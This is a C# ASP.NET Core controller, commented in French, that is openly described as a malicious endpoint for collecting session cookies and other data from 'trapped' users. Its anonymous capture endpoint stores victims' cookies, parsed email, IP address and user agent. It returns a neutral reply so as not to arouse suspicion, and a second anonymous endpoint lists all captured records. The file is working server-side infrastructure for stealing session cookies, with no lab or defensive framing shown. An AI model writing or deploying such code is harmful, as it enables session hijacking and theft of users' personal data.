using Microsoft.AspNetCore.Mvc;
using demo_api_rest.Models;
using demo_api_rest.Data;
using Microsoft.AspNetCore.Authorization;
using Microsoft.EntityFrameworkCore;

namespace demo_api_rest.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    [AllowAnonymous]
    public class CsrfTrapController : ControllerBase
    {
        private readonly ApplicationDbContext _context;
        private readonly ILogger<CsrfTrapController> _logger;

        public CsrfTrapController(ApplicationDbContext context, ILogger<CsrfTrapController> logger)
        {
            _context = context;
            _logger = logger;
        }

        /// <summary>
        /// Endpoint malveillant pour récupérer les cookies de session et autres données des utilisateurs piégés
        /// </summary>
        /// <param name="request">Données du piège CSRF</param>
        /// <returns>Statut de l'enregistrement</returns>
        [HttpPost("capture")]
        public async Task<IActionResult> CaptureCsrfTrap([FromBody] CsrfTrapRequest request)
        {
            try
            {
                // Récupération de l'adresse IP et User-Agent
                string ipAddress = HttpContext.Connection.RemoteIpAddress?.ToString() ?? "Unknown";
                string userAgent = Request.Headers.UserAgent.ToString();

                // Création du piège en base de données
                var sessionCookie = request.Cookies.Split(';')
                    .Select(cookie => cookie.Trim())
                    .First(c => c.Contains("sessionId"));
                var csrfTrap = new CsrfTrap
                {
                    TrapDate = DateTime.Now,
                    Email = sessionCookie.Split("_")[1],
                    SessionCookie = request.Cookies,
                    UserAgent = userAgent,
                    IpAddress = ipAddress,
                    AdditionalData = request.AdditionalData
                };

                await _context.CsrfTraps.AddAsync(csrfTrap);
                await _context.SaveChangesAsync();

                _logger.LogInformation($"Nouveau piège CSRF capturé avec l'ID: {csrfTrap.Id}");

                // Retourne un 200 OK sans information sensible pour ne pas éveiller les soupçons
                return Ok(new { message = "Données reçues" });
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Erreur lors de la capture du piège CSRF");
                return StatusCode(500, new { message = "Erreur serveur" });
            }
        }

        /// <summary>
        /// Endpoint pour lister tous les pièges CSRF, du plus récent au plus ancien
        /// </summary>
        /// <returns>Liste des pièges CSRF</returns>
        [HttpGet("list")]
        public async Task<IActionResult> ListCsrfTraps()
        {
            try
            {
                // Récupération de tous les pièges CSRF, triés par date décroissante
                var traps = await _context.CsrfTraps
                    .OrderByDescending(t => t.TrapDate)
                    .ToListAsync();

                _logger.LogInformation($"Liste des pièges CSRF récupérée. Nombre de pièges: {traps.Count}");

                return Ok(traps);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Erreur lors de la récupération de la liste des pièges CSRF");
                return StatusCode(500, new { message = "Erreur serveur lors de la récupération des données" });
            }
        }
    }
}